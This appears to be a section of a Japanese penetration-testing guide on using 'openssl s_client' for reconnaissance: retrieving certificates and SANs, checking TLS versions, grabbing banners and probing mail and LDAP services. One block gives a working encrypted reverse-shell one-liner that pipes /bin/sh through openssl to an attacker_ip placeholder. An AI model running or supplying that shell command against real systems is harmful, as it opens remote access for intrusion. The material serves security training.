### 3.5 openssl

`openssl s_client` は、SSL/TLSで暗号化されたサービス（HTTPS、SMTPS、IMAPSなど）へ直接接続し、**証明書・TLS設定・暗号スイート・バナー情報**などを調査するためのコマンドです。

> **主な用途**
> - SSL/TLS証明書の取得
> - TLSバージョンの確認
> - 暗号スイートの調査
> - HTTPSなど暗号化サービスのバナー取得
> - TLS通信の手動検証

---

#### 主なオプション

| オプション | 説明 | 使用頻度 |
|------------|------|:-------:|
| `-connect <host>:<port>` | 接続先ホスト・ポートを指定 | ⭐⭐⭐⭐⭐ |
| `-quiet` | 余計なTLS情報を表示せず対話通信に集中 | ⭐⭐⭐⭐☆ |
| `-showcerts` | サーバー証明書チェーンを表示 | ⭐⭐⭐⭐⭐ |
| `-tls1` | TLS 1.0で接続を試行 | ⭐⭐⭐☆☆ |
| `-tls1_1` | TLS 1.1で接続を試行 | ⭐⭐⭐☆☆ |
| `-tls1_2` | TLS 1.2で接続を試行 | ⭐⭐⭐⭐⭐ |
| `-tls1_3` | TLS 1.3で接続を試行 | ⭐⭐⭐⭐⭐ |
| `-ssl3` | SSLv3で接続を試行（古いOpenSSLのみ） | ⭐⭐☆☆☆ |
| `-ssl2` | SSLv2で接続を試行（現在はほぼ廃止） | ⭐☆☆☆☆ |

> **💡 Tips**
>
> 現在のOpenSSLでは `-ssl2` や `-ssl3` はサポートされていないことが多く、実務では `-tls1_2` と `-tls1_3` を使用するケースが中心です。

---

#### 活用例

##### SSL/TLS証明書の取得

ターゲットの証明書を表示します。

```bash
openssl s_client -connect example.com:443
```

取得できる情報

- Subject
- Issuer
- 有効期限
- 公開鍵
- TLSバージョン
- Cipher Suite

---

##### 証明書チェーンの取得

サーバーから送信された証明書チェーン全体を表示します。

```bash
openssl s_client -connect example.com:443 -showcerts
```

調査できる項目

- Root CA
- Intermediate CA
- Server Certificate

---

##### 証明書のみを保存

後から `openssl x509` で解析したい場合。

```bash
openssl s_client -connect example.com:443 </dev/null 2>/dev/null \
| sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' \
> cert.pem
```

保存後

```bash
openssl x509 -in cert.pem -text -noout
```

取得できる情報

- Subject
- Issuer
- SAN
- 有効期限
- Fingerprint

---

##### SAN（Subject Alternative Name）の確認

複数のドメイン名が登録されている場合があります。

```bash
openssl x509 -in cert.pem -text -noout
```

確認ポイント

- SAN
- ワイルドカード証明書
- サブドメイン

例

```text
DNS:www.example.com
DNS:mail.example.com
DNS:vpn.example.com
```

SANから新しい攻撃対象を発見できることがあります。

---

##### TLSバージョンの確認

TLS 1.2

```bash
openssl s_client -connect example.com:443 -tls1_2
```

TLS 1.3

```bash
openssl s_client -connect example.com:443 -tls1_3
```

古いTLSが有効か調べる場合

```bash
openssl s_client -connect example.com:443 -tls1
```

調査目的

- TLS1.0
- TLS1.1
- TLS1.2
- TLS1.3

対応状況を確認できます。

---

##### 古いSSL/TLSの確認

古いOpenSSLのみ

```bash
openssl s_client -connect example.com:443 -ssl3
```

または

```bash
openssl s_client -connect example.com:443 -ssl2
```

接続できる場合

- SSLv2
- SSLv3

など危険なプロトコルが有効になっている可能性があります。

---

##### HTTPSのバナー取得

TLS通信のままHTTPリクエストを送信できます。

```bash
openssl s_client -quiet -connect example.com:443
```

接続後

```http
HEAD / HTTP/1.0

```

取得例

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: ...
```

取得できる情報

- Server
- Location
- Powered-By
- Cookie

---

##### SMTPS・IMAPSなどの調査

HTTPS以外でもTLS通信なら調査できます。

SMTP

```bash
openssl s_client -connect mail.example.com:465
```

IMAPS

```bash
openssl s_client -connect mail.example.com:993
```

POP3S

```bash
openssl s_client -connect mail.example.com:995
```

LDAPS

```bash
openssl s_client -connect ldap.example.com:636
```

---

##### 暗号化されたシェル通信（参考）

> ⚠️ **CTFや認可された検証環境のみで使用してください。**

SSL/TLSで通信を暗号化したシェル接続の例です。

```bash
mkfifo /tmp/s; \
/bin/sh -i < /tmp/s 2>&1 | \
openssl s_client -quiet -connect <attacker_ip>:<port> \
> /tmp/s; \
rm /tmp/s
```

---

#### Reconnaissanceでよく使うコマンド

| 目的 | コマンド |
|------|----------|
| 証明書確認 | `openssl s_client -connect target:443` |
| 証明書チェーン | `openssl s_client -connect target:443 -showcerts` |
| TLS1.2確認 | `openssl s_client -connect target:443 -tls1_2` |
| TLS1.3確認 | `openssl s_client -connect target:443 -tls1_3` |
| バナー取得 | `openssl s_client -quiet -connect target:443` |
| 証明書保存 | `openssl s_client ... > cert.pem` |

---

#### Nmapとの使い分け

| 項目 | Nmap | OpenSSL s_client |
|------|:---:|:----------------:|
| ポートスキャン | ✅ | ❌ |
| サービス検出 | ✅ | ❌ |
| TLS証明書取得 | ◯ | ✅ |
| TLSバージョン確認 | ◯ | ✅ |
| 暗号スイート確認 | ◯（NSE） | ◯ |
| HTTPバナー取得 | △ | ✅ |
| 手動でTLS通信を確認 | ❌ | ✅ |

> **おすすめの使い分け**
>
> - **Nmap**：SSL/TLSサービスの発見や網羅的な列挙（`ssl-enum-ciphers`、`ssl-cert`、`ssl-heartbleed` などのNSEスクリプト）
> - **openssl s_client**：特定サービスのTLS設定を手動で確認したり、証明書やバナーを詳細に調査したい場合

#### 確認ポイント
- Server: Apache / nginx / IIS  
- X-Powered-By: PHP / ASP.NET  
- admin パネルの存在  
- 内部ホスト名（CN/SAN）  

---
